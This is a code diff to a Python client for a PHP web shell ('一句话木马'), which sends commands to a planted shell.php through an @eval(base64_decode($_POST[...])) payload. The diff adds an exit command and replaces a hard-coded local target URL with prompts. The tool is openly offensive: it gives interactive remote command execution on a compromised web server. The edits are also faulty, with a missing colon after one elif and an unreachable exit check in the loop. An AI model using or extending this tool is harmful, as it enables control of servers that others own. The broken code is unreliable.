@@ -20,6 +20,8 @@ def php_horse(url,parameter,header,pa=""):
 	cmd=str(input("\n["+str(file_path)+"]$ "))
 	if cmd == "":
 		return "None"
+	elif cmd =="exit"
+		return "exit"
 	#za=@eval(base64_decode($_POST[z0]));
 	zaphp="@eval(base64_decode(\"QGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbejBdKSk7\"));"
 	#zbphp为命令执行代码
@@ -34,12 +36,12 @@ def php_horse(url,parameter,header,pa=""):
 	for i in range(len(result)-3):
 		print (result[i]+" ",end="")
 	return result[-3]
-#parameter=str(input("输入一句话木马参数: "))
-parameter="cmd"
-url="http://192.168.0.118/shell.php"
-#url=str(input("输入一句话木马url: "))
+url=str(input("木马url: "))
+parameter=str(input("木马参数: "))
 pa=php_horse(url,parameter,header) #pa为路径判断所需函数
 while True:
 	if pa!="":
 		pa=php_horse(url,parameter,header,pa=pa)
+	elif pa=="exit":
+		break
 
